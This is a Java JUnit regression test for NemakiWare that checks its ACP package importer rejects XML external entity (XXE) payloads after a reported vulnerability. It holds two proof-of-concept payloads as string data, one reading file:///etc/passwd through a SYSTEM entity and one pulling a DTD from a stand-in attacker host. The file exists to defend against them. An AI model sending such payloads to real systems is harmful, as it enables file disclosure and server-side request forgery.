/*****************************************************************************
 Copyright (c) 2026 aegif.

 This file is part of NemakiWare.
 *****************************************************************************/
package jp.aegif.nemaki.rest.importexport;

import static org.junit.jupiter.api.Assertions.assertEquals;
import static org.junit.jupiter.api.Assertions.assertFalse;
import static org.junit.jupiter.api.Assertions.assertNotNull;
import static org.junit.jupiter.api.Assertions.assertTrue;

import java.io.ByteArrayInputStream;
import java.nio.charset.StandardCharsets;

import org.dom4j.Document;
import org.dom4j.DocumentException;
import org.dom4j.Element;
import org.junit.jupiter.api.Test;

/**
 * RC6.11 — regression for the GHSA XXE on the ACP import path
 * (reporter: tonghuaroot). Pre-RC6.11 the {@link ZipImporter} read
 * its package XML with a bare {@code new SAXReader()} that resolved
 * DOCTYPE / SYSTEM / parameter entities — an authenticated
 * non-admin user with {@code cmis:write} on a single folder could
 * upload an ACP whose top-level {@code *.xml} embedded a SYSTEM
 * entity pointing at {@code file:///etc/passwd}, and the resolved
 * file content was persisted into a CMIS object name (readable
 * back through the CMIS API).
 *
 * <p>RC6.12 follow-up: the tests now call
 * {@link ZipImporter#parseAcpPackageXml(byte[])} directly — the
 * exact static helper that {@code importAcpFormat(...)} uses on
 * the production path. If any of the three SAX feature flags is
 * ever removed from the production code, these tests fail. (The
 * RC6.11 version of this test duplicated the SAXReader
 * configuration inside the test class, so removing the production
 * guards would have left the test green — reviewer P2 finding.)
 *
 * <p>The fourth assertion confirms benign DOCTYPE-free packages
 * still parse, guarding against a regression that hardens by
 * failing all XML.
 */
public class ZipImporterXxeTest {

    @Test
    public void rejectsDoctypeWithFileSystemEntity() {
        String poc = "<?xml version=\"1.0\"?>\n"
                + "<!DOCTYPE r [ <!ENTITY xxe SYSTEM \"file:///etc/passwd\"> ]>\n"
                + "<root><folder><name>&xxe;</name></folder></root>";
        DocumentException thrown = null;
        try {
            ZipImporter.parseAcpPackageXml(poc.getBytes(StandardCharsets.UTF_8));
        } catch (DocumentException e) {
            thrown = e;
        }
        assertNotNull(thrown,
                "ZipImporter.parseAcpPackageXml MUST reject DOCTYPE payloads (XXE) — "
                + "if this assertion fails, the production guard has regressed");
        String msg = String.valueOf(thrown.getMessage());
        assertTrue(msg.contains("DOCTYPE") || msg.contains("disallow-doctype-decl"),
                "DocumentException must reference DOCTYPE rejection; was: " + msg);
    }

    @Test
    public void rejectsDoctypeWithExternalParameterEntity() {
        // Blind/out-of-band variant: parameter entity referencing an
        // external DTD. Used to defeat targets that don't echo the
        // resolved entity back through the API.
        String poc = "<?xml version=\"1.0\"?>\n"
                + "<!DOCTYPE root SYSTEM \"http://attacker.example.invalid/evil.dtd\">\n"
                + "<root><folder><name>x</name></folder></root>";
        DocumentException thrown = null;
        try {
            ZipImporter.parseAcpPackageXml(poc.getBytes(StandardCharsets.UTF_8));
        } catch (DocumentException e) {
            thrown = e;
        }
        assertNotNull(thrown,
                "ZipImporter.parseAcpPackageXml MUST reject DOCTYPE-with-external-DTD "
                + "(blind XXE / SSRF variant)");
    }

    @Test
    public void acceptsBenignDoctypeFreePackageXml() throws DocumentException {
        // The legitimate ACP shape: well-formed XML, no DOCTYPE, no
        // entity refs. Must still parse cleanly — the fix must not
        // over-block.
        String benign = "<?xml version=\"1.0\"?>\n"
                + "<root><folder><name>benign_folder</name></folder></root>";
        Document doc = ZipImporter.parseAcpPackageXml(
                benign.getBytes(StandardCharsets.UTF_8));
        assertNotNull(doc, "Benign ACP XML must parse cleanly");
        Element root = doc.getRootElement();
        assertNotNull(root);
        assertEquals("root", root.getName());
        Element folder = root.element("folder");
        assertNotNull(folder, "<folder> element must be present");
        assertEquals("benign_folder", folder.element("name").getTextTrim());
    }

    @Test
    public void productionParserHasAllThreeFeaturesEnabled() throws Exception {
        // RC6.13: this test now binds to the actual SAXReader instance
        // that the production code path builds — not a test-local
        // probe with the same features set independently. If any of
        // the three setFeature(...) calls is deleted from
        // ZipImporter.configureHardenedSaxReader(), the matching
        // assertion below fails.
        //
        // The RC6.12 version of this test built its own probe
        // SAXReader and queried that. That structure was caught by
        // the RC6.12 external reviewer: removing (e.g.)
        // external-general-entities=false from production alone
        // would have left the DOCTYPE rejection tests green (the
        // disallow-doctype-decl feature catches the PoC payload
        // earlier) AND the readback test green (because the readback
        // queried the probe, not production).
        //
        // The fix is structural: ZipImporter.configureHardenedSaxReader()
        // is now the single source of truth for the SAXReader
        // configuration. parseAcpPackageXml(...) calls it, and so does
        // this test. .read(...) is called below to force the underlying
        // XMLReader to be instantiated so getFeature(...) can read the
        // configured values back.
        org.dom4j.io.SAXReader productionReader = ZipImporter.configureHardenedSaxReader();
        productionReader.read(new ByteArrayInputStream(
                "<?xml version=\"1.0\"?><r/>".getBytes(StandardCharsets.UTF_8)));
        org.xml.sax.XMLReader xmlReader = productionReader.getXMLReader();
        assertTrue(
                xmlReader.getFeature("http://apache.org/xml/features/disallow-doctype-decl"),
                "disallow-doctype-decl must be true on the production-configured reader");
        assertFalse(
                xmlReader.getFeature("http://xml.org/sax/features/external-general-entities"),
                "external-general-entities must be false on the production-configured reader");
        assertFalse(
                xmlReader.getFeature("http://xml.org/sax/features/external-parameter-entities"),
                "external-parameter-entities must be false on the production-configured reader");
    }
}
